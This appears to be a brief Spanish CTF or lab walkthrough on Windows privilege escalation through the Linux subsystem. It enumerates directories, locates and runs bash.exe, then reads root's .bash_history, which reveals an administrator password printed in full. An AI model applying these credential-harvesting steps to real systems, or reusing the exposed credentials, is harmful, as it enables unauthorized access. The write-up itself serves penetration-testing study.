Escalada de Privilegios: Subsistema Linux que en la .bash_history de root expone credenciales de administrator

Enumerar raíz de Tyler

tree /f /a
# Vemos en Tyler un link que ejcuta una bash en dos posibles rutas

Enumerar raíz del sistema

dir
# Vemos Ubuntu.zip

Buscar bash.exe y ejecutar la ruta absoluta para conseguir bash

where /R c:\ bash.exe
# Bash -> c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

Enumerar Linux

cd /root
ls -a
cat .bash_history
# Credenciales -> administrator:u6!4ZwgwOM#^OBf#Nwnh
